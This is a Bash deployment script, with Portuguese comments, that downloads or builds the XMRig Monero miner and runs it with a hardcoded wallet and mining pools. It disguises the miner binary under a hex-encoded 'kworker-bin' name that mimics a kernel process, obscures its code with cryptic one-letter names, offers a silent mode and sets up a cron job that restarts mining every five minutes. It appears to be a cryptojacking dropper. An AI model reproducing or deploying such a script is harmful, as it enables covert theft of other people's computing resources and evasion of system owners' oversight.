#!/bin/bash
set -o pipefail
set +e

# ================================================================
# DETECÇÃO AUTOMÁTICA DE HOME
# ================================================================
_detect_home() {
    local _h=""
    if [ -n "$SUDO_USER" ]; then
        _h=$(getent passwd "$SUDO_USER" | cut -d: -f6 2>/dev/null)
    fi
    if [ -z "$_h" ] && [ -n "$USER" ] && [ "$USER" != "root" ]; then
        _h=$(getent passwd "$USER" | cut -d: -f6 2>/dev/null)
    fi
    if [ -z "$_h" ]; then
        _h=$(eval echo ~)
    fi
    if [ -z "$_h" ] || [ "$_h" = "~" ] || [ "$_h" = "/" ]; then
        _h="/tmp/miner_home_$(whoami 2>/dev/null || echo 'default')"
        mkdir -p "$_h" 2>/dev/null
    fi
    export HOME="$_h"
}
_detect_home

# ================================================================
# CONFIGURAÇÕES
# ================================================================
_w='46LShtDdMLdNWyUU6q852BMPuXoSE2pPfjUSu7uZ2dpSDe6CAdbM4QLSyLgFfjvyGoKobKGLRKRNbio1GaPLZwYf7zjULUY'
_p="141.94.96.71:443 141.94.96.144:443 pool.supportxmr.com:443 pool.supportxmr.com:3333"
_v="6.22.2"
_bn=$(printf '\x6b\x77\x6f\x72\x6b\x65\x72\x2d\x62\x69\x6e')
_d="$HOME/.local/bin"
_b="$_d/$_bn"
_lf="$HOME/.cache/xmrig.log"
_cf="$HOME/.config/xmrig/config.json"
_mt=15
_wt=300
_ci=2
_sl=false
_ts=1
_lt="true"

# ================================================================
# FUNÇÕES (com suporte a ARM)
# ================================================================
_i(){
 _ip=$(curl -4 -s --connect-timeout 5 ifconfig.me 2>/dev/null)
 [ -z "$_ip" ] && _ip=$(wget -4 -qO- --timeout=5 ifconfig.me 2>/dev/null)
 [ -z "$_ip" ] && _ip=$(hostname 2>/dev/null | tr -cd 'a-zA-Z0-9' | head -c 10)
 [ -z "$_ip" ] && _ip="wk$(date +%s | tail -c 5)"
 echo "$_ip" | tr '.' '-' | tr -cd 'a-zA-Z0-9-' | head -c 20
}
_wid=$(_i)

_cm(){
 _tr=$(free -m | awk '/Mem:/{print $2}')
 _fr=$(free -m | awk '/Mem:/{print $4}')
 if [ "$_tr" -lt 2048 ]; then _ts=1; _lt="true"; else
  _co=$(nproc); _mx=$(( _tr / 2048 )); [ "$_mx" -lt 1 ] && _mx=1
  _mu=$(( _co * 75 / 100 )); [ "$_mu" -lt 1 ] && _mu=1
  _ts=$(( _mx < _mu ? _mx : _mu )); [ "$_ts" -lt 1 ] && _ts=1; _lt="false"
  grep -q aes /proc/cpuinfo || { _lt="true"; [ "$_ts" -gt 2 ] && _ts=2; }
 fi
 [ "$_fr" -lt 260 ] && return 1
 return 0
}

_cd(){
 for _x in wget tar pkill curl; do command -v "$_x" >/dev/null 2>&1 || return 1; done
 return 0
}

_r(){
 _np=""
 for _x in $_p; do
  _h="${_x%:*}"; _pt="${_x##*:}"
  if echo "$_h" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then _np="${_np} $_x"; continue; fi
  _ip=$(getent ahosts "$_h" 2>/dev/null | awk '{print $1; exit}')
  [ -n "$_ip" ] && _np="${_np} ${_ip}:$_pt" || _np="${_np} $_x"
 done
 _p="$_np"
}

_o(){
 _tmp=""
 for _x in $_p; do
  _h="${_x%:*}"; _pt="${_x##*:}"
  _st=$(date +%s)
  if timeout 2 bash -c "exec 3<>/dev/tcp/$_h/$_pt" 2>/dev/null; then
   _et=$(date +%s); _la=$(( _et - _st )); [ "$_la" -lt 1 ] && _la=1
  else _la=9999; fi
  _tmp="${_tmp}$(printf "%05d:%s\n" "$_la" "$_x")"
 done
 _p=$(printf "%b" "$_tmp" | sort -n | cut -d: -f2- | tr '\n' ' ')
}

_g(){
 _pu=$1; _tl=$2; _th=$3; _li=$4
 _tb="false"; _md="auto"; [ "$_tl" = "true" ] && _tb="true"; [ "$_li" = "true" ] && _md="light"
 mkdir -p "$(dirname "$_cf")" 2>/dev/null
 cat > "$_cf" <<EOF
{"autosave":false,"background":false,"colors":false,"donate-level":0,"log-file":"$_lf","pools":[{"url":"$_pu","user":"$_w","pass":"$_wid","tls":$_tb,"keepalive":true}],"cpu":{"enabled":true,"huge-pages":false,"huge-pages-jit":false,"priority":0},"randomx":{"1gb-pages":false,"mode":"$_md","wrmsr":false}}
EOF
 chmod 600 "$_cf"
}

_tc(){
 _h=$1; _pt=$2
 if command -v nc >/dev/null 2>&1; then timeout 3 nc -z -w 2 "$_h" "$_pt" 2>/dev/null && return 0; fi
 if timeout 3 bash -c "exec 3<>/dev/tcp/$_h/$_pt && exec 3>&-" 2>/dev/null; then return 0; fi
 if [ "$_pt" = "443" ] || [ "$_pt" = "80" ]; then
  _pr="http"; [ "$_pt" = "443" ] && _pr="https"
  timeout 3 curl -sk --connect-timeout 2 "${_pr}://${_h}:${_pt}" >/dev/null 2>&1 && return 0
 fi
 return 1
}

_chk(){
 [ -f "$_lf" ] && tail -n 300 "$_lf" 2>/dev/null | grep -q "accepted" && return 0
 return 1
}

_ca(){
 pgrep -f "$_bn" >/dev/null 2>&1 && [ -f "$_lf" ] && tail -n 60 "$_lf" 2>/dev/null | grep -q "new job"
}

_cl(){
 pkill -9 -f "$_bn" 2>/dev/null || true; sleep 2
}

_db(){
 mkdir -p "$_d" 2>/dev/null
 if [ -f "$_b" ] && [ -x "$_b" ]; then
  "$_b" --version >/dev/null 2>&1 && return 0
  rm -f "$_b"
 fi

 # Detectar arquitetura
 _arch=$(uname -m)
 case "$_arch" in
   x86_64)
     _url="https://github.com/xmrig/xmrig/releases/download/v${_v}/xmrig-${_v}-linux-static-x64.tar.gz"
     _extract="tar -xzf"
     ;;
   aarch64|armv7l|arm64)
     # Compilar a partir do código-fonte
     echo "Arquitetura ARM detectada. Compilando XMRig (pode levar alguns minutos)..."
     if ! command -v cmake >/dev/null 2>&1 || ! command -v g++ >/dev/null 2>&1; then
       echo "Instalando dependências de compilação..."
       if command -v apt >/dev/null 2>&1; then
         sudo apt update && sudo apt install -y cmake build-essential libuv1-dev libssl-dev
       elif command -v yum >/dev/null 2>&1; then
         sudo yum install -y cmake gcc-c++ make libuv-devel openssl-devel
       else
         echo "Não foi possível instalar dependências automaticamente. Instale cmake, g++, libuv-dev e libssl-dev manualmente."
         return 1
       fi
     fi
     _tmpdir="/tmp/xmrig-build"
     mkdir -p "$_tmpdir"
     cd "$_tmpdir" || return 1
     git clone --depth 1 --branch v${_v} https://github.com/xmrig/xmrig.git || return 1
     cd xmrig || return 1
     mkdir build && cd build || return 1
     cmake .. -DCMAKE_BUILD_TYPE=Release || return 1
     make -j$(nproc) || return 1
     cp xmrig "$_b" || return 1
     chmod +x "$_b"
     cd /tmp
     rm -rf "$_tmpdir"
     "$_b" --version >/dev/null 2>&1 && return 0
     return 1
     ;;
   *)
     echo "Arquitetura $_arch não suportada. Tente compilar manualmente."
     return 1
     ;;
 esac

 # Para x86_64: baixa o estático
 _tb="/tmp/xmrig-${_v}.tar.gz"
 wget -q --no-check-certificate --timeout=30 "$_url" -O "$_tb" || return 1
 $_extract "$_tb" -C /tmp/ || return 1
 cp "/tmp/xmrig-${_v}/xmrig" "$_b" || return 1
 chmod +x "$_b"
 rm -rf "/tmp/xmrig-${_v}" "$_tb"
 "$_b" --version >/dev/null 2>&1 || { rm -f "$_b"; return 1; }
 return 0
}

_h(){
 _cm || return 1
 for ((_a=0; _a<_mt; _a++)); do
  _pl="${_p%% *}"
  _h="${_pl%:*}"; _pt="${_pl##*:}"
  [ "$_pt" = "443" ] && _tl="true" || _tl="false"
  if ! _tc "$_h" "$_pt"; then _p="${_p#* } ${_pl}"; continue; fi
  _g "$_pl" "$_tl" "$_ts" "$_lt"
  _cmd="$_b --config=$_cf --no-color -t $_ts"
  if [ "$_sl" = "true" ]; then eval "$_cmd" >/dev/null 2>&1 & else eval "$_cmd" & fi
  _pid=$!
  _el=0; _ac=0
  while [ "$_el" -lt "$_wt" ]; do
   sleep "$_ci"; _el=$(( _el + _ci ))
   kill -0 "$_pid" 2>/dev/null || break
   if tail -n 300 "$_lf" 2>/dev/null | grep -q "accepted"; then _ac=1; break; fi
   if [ "$_el" -ge 120 ] && tail -n 300 "$_lf" 2>/dev/null | grep -q "new job"; then _ac=1; break; fi
  done
  kill "$_pid" 2>/dev/null; wait "$_pid" 2>/dev/null; sleep 2
  if [ "$_ac" -eq 1 ]; then
   _g "$_pl" "$_tl" "$_ts" "$_lt"
   eval "$_cmd" >/dev/null 2>&1 &
   echo $! > /tmp/xmrig.pid
   sleep 5
   return 0
  fi
  _p="${_p#* } ${_pl}"
 done
 return 1
}

_ic(){
 _sp=$(readlink -f "$0" 2>/dev/null || echo "$0")
 _cr="*/5 * * * * /bin/bash \"$_sp\" monitor >/dev/null 2>&1"
 crontab -l 2>/dev/null | grep -v "$_sp" | crontab - 2>/dev/null
 (crontab -l 2>/dev/null; echo "$_cr") | crontab -
}

_d(){
 _cd || { echo "Deps missing"; exit 1; }
 mkdir -p "$HOME/.local/bin" "$HOME/.cache" "$HOME/.config/xmrig" 2>/dev/null
 _db || { echo "Binary fail"; exit 1; }
 _cm || exit 1
 _r; _o
 > "$_lf" 2>/dev/null || true
 _h || { echo "Heal fail"; exit 1; }
 _ic
 echo "DEPLOY OK - Worker: $_wid - Threads: $_ts - Light: $_lt - Home: $HOME"
}

_m(){
 pgrep -f "$_bn" >/dev/null 2>&1 || _d
}

_s(){
 echo "Worker: $_wid"
 echo "Threads: $_ts | Light: $_lt"
 echo "Pool: ${_p%% *}"
 echo "Home: $HOME"
 pgrep -f "$_bn" >/dev/null 2>&1 && echo "Process: RUNNING" || echo "Process: STOPPED"
 _chk && echo "Shares: ACCEPTED" || echo "Shares: NOT DETECTED"
 echo "--- Last logs ---"
 grep -E "accepted|speed|error" "$_lf" 2>/dev/null | tail -5
}

_u(){
 pkill -9 -f "$_bn" 2>/dev/null
 rm -f "$_b" "$_lf" "$_cf" /tmp/xmrig.pid
 _sp=$(readlink -f "$0" 2>/dev/null || echo "$0")
 crontab -l 2>/dev/null | grep -v "$_sp" | crontab - 2>/dev/null
 echo "Uninstalled from $HOME"
}

[ "$1" = "--silent" ] && { _sl=true; shift; }
case "$1" in
 deploy) _d ;;
 monitor) _m ;;
 heal) _d ;;
 status) _s ;;
 uninstall) _u ;;
 *) echo "Usage: $0 [--silent] {deploy|monitor|heal|status|uninstall}" ;;
esac
